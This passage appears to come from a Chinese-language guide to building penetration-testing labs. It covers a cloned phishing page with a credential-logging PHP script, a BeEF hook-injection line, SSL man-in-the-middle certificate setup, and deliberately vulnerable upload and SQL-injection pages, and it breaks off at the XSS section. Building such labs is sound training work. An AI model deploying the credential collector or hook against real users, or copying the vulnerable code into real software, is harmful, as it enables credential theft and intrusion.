<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">python3</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -m</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> http.server</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 8000</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 或使用PHP内置服务器</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">php</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -S</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 0.0.0.0:8000</span></span></code></pre></figure>
<h3 id="4-搭建钓鱼页面测试环境">4. 搭建钓鱼页面测试环境<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#4-搭建钓鱼页面测试环境" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ⚠️ 仅限授权测试使用！</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 创建钓鱼页面目录</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mkdir</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/phishing-test</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 克隆目标网站（使用HTTrack）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apt</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> install</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> httrack</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -y</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">httrack</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;https://example.com&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -O</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /tmp/clone</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 复制到Web目录</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> cp</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -r</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /tmp/clone/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">*</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/phishing-test/</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 修改表单action指向你的收集脚本</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 创建简单的日志收集脚本</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">cat</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> &lt;&lt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 'EOF'</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tee</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/phishing-test/collect.php</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;?php</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">// ⚠️ 仅用于授权测试</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">$data = json_encode($_POST);</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">file_put_contents('/tmp/phishing-log.txt', $data . PHP_EOL, FILE_APPEND);</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">header('Location: https://example.com');</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">exit;</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">?></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">EOF</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 配置虚拟主机</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nano</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/sites-available/phishing-test.conf</span></span></code></pre></figure>
<h3 id="5-搭建beefbrowser-exploitation-framework">5. 搭建BeEF（Browser Exploitation Framework）<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#5-搭建beefbrowser-exploitation-framework" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 安装依赖</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apt</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> install</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ruby-full</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> git</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -y</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 克隆BeEF</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">cd</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /opt</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> git</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> clone</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> https://github.com/beefproject/beef.git</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">cd</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> beef</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 安装Gem依赖</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> gem</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> install</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> bundler</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> bundle</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> install</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 配置BeEF</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nano</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> config.yaml</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 修改密码等配置</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启动BeEF</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">./beef</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 在目标页面中注入hook脚本</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># &lt;script src=&quot;http://[your-ip]:3000/hook.js&quot;>&lt;/script></span></span></code></pre></figure>
<h3 id="6-配置ssl中间人测试环境">6. 配置SSL中间人测试环境<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#6-配置ssl中间人测试环境" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 安装SSLsplit</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apt</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> install</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> sslsplit</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -y</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 生成CA证书</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">openssl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> genrsa</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -out</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ca.key</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 4096</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">openssl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> req</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -new</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -x509</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -days</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 365</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -key</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ca.key</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -out</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ca.crt</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 配置Apache作为前端代理</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 用于测试SSL剥离攻击等</span></span></code></pre></figure>
<h3 id="7-文件上传漏洞测试环境">7. 文件上传漏洞测试环境<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#7-文件上传漏洞测试环境" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 创建上传目录</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mkdir</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/upload-test/uploads</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> chmod</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 777</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/upload-test/uploads</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 创建简单的上传页面</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">cat</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> &lt;&lt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 'EOF'</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tee</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/upload-test/index.php</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;!DOCTYPE html></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;html></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;head>&lt;title>File Upload Test&lt;/title>&lt;/head></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;body></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;h2>Upload File&lt;/h2></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    &lt;input type=&quot;file&quot; name=&quot;file&quot;></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;/form></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;/body></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;/html></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">EOF</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 创建有漏洞的上传处理脚本（仅用于测试）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">cat</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> &lt;&lt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 'EOF'</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tee</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/upload-test/upload.php</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;?php</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">// ⚠️ 故意设计的有漏洞代码，仅用于测试</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">$target_dir = &quot;uploads/&quot;;</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">$target_file = $target_dir . basename($_FILES[&quot;file&quot;][&quot;name&quot;]);</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">if (move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $target_file)) {</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    echo &quot;File uploaded: &quot; . $target_file;</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">} else {</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    echo &quot;Upload failed!&quot;;</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">}</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">?></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">EOF</span></span></code></pre></figure>
<h3 id="8-sql注入测试环境">8. SQL注入测试环境<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#8-sql注入测试环境" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 创建测试数据库</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mysql</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> root</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="sql" data-theme="github-light github-dark"><code data-language="sql" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">CREATE</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> DATABASE</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> sqli_test</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">USE</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> sqli_test;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">CREATE</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> TABLE</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> users</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> (</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    id </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">INT</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> AUTO_INCREMENT </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">PRIMARY KEY</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    username </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">VARCHAR</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">50</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">),</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    password</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> VARCHAR</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">50</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">),</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    email </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">VARCHAR</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">100</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">INSERT INTO</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> users </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">VALUES</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> </span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'admin'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'admin123'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'admin@test.com'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">),</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">2</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'user'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'user123'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'user@test.com'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">CREATE</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> USER</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> '</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">testuser</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">'@</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'localhost'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> IDENTIFIED </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">BY</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 'testpass'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">GRANT</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ALL PRIVILEGES </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">ON</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> sqli_test.</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">*</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> TO</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 'testuser'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">@</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'localhost'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">FLUSH PRIVILEGES;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">EXIT;</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 创建有漏洞的PHP页面</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">cat</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> &lt;&lt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 'EOF'</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tee</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/sqli-test.php</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;?php</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">// ⚠️ 故意设计的有漏洞代码</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">$conn = new mysqli(&quot;localhost&quot;, &quot;testuser&quot;, &quot;testpass&quot;, &quot;sqli_test&quot;);</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">if(isset($_GET['id'])) {</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    $id = $_GET['id'];</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    $sql = &quot;SELECT * FROM users WHERE id = $id&quot;;  // 有SQL注入漏洞</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    $result = $conn->query($sql);</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    </span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    while($row = $result->fetch_assoc()) {</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        echo &quot;ID: &quot; . $row['id'] . &quot; - Name: &quot; . $row['username'] . &quot;&lt;br>&quot;;</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    }</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">}</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">?></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;form method=&quot;GET&quot;></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    User ID: &lt;input type=&quot;text&quot; name=&quot;id&quot;></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    &lt;input type=&quot;submit&quot; value=&quot;Search&quot;></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;/form></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">EOF</span></span></code></pre></figure>
<h3 id="9-xss测试环境">9. XSS测试环境<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#9-xss测试环境" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 创建XSS测试页面</span></span>
